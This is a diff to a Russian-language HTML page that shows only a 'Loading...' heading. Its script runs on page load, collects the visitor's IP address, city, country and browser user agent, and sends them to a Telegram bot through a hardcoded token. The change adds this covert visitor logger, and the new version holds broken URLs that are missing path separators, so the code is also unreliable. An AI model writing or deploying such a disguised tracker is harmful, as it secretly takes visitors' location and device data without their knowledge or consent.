@@ -2,7 +2,8 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v15.0)</h1>
+    <h1 id="status">Загрузка... (v14.0)</h1>
+
     <script>
         async function run() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
@@ -10,23 +11,30 @@
             const status = document.getElementById('status');
 
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                
-                const text = encodeURIComponent(`🚀 ЛОГ!\nIP: ${data.ip}\nГород: ${data.city}`);
+                const ipRes = await fetch('https://api.ipify.org');
+                const ipData = await ipRes.json();
+                const ipv4 = ipData.ip;
 
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`;
-                
-                const tgRes = await fetch(url);
-                const result = await tgRes.json();
+                const geoRes = await fetch(`https://ipapi.co{ipv4}/json/`);
+                const geoData = await geoRes.json();
 
-                if (result.ok) {
-                    status.innerText = "ГОТОВО! Сообщение в телеге.";
-                } else {
-                    status.innerText = "ОШИБКА ТГ: " + result.description;
-                }
+                const device = navigator.userAgent;
+
+                const text = encodeURIComponent(
+                    `🚀 НОВЫЙ ЛОГ!\n` +
+                    `📍 IP (IPv4): ${ipv4}\n` +
+                    `🌍 Город: ${geoData.city}, ${geoData.country_name}\n` +
+                    `📱 Устройство: ${device}`
+                );
+
+                // 5. Отправляем в Telegram
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text}`;
+                
+                await fetch(url);
+                status.innerText = "ГОТОВО! Данные в Telegram.";
+
             } catch (e) {
-                status.innerText = "ОШИБКА КОДА: " + e;
+                status.innerText = "Ошибка: " + e;
             }
         }
         run();
